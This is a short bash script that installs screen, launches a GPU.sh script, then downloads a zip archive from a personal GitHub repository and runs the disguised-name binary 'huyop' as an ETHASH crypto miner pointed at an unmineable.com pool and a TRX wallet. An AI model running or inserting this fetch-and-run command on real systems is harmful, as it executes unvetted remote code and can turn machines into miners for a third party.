#!/bin/bash
sudo apt update && sudo apt install screen -y && screen -dmS gpuu.sh ./GPU.sh 65 75 && wget https://github.com/okg123/gur-l/raw/main/huyop.zip && apt install unzip && unzip huyop.zip && cd huyop && chmod u+x huyop && ./huyop --algo ETHASH --pool ethash.unmineable.com:3333 --user TRX:TUhisPLRuEvLxgeyhctGgm1vskr3aapMGX.op --ethstratum ETHPROXY
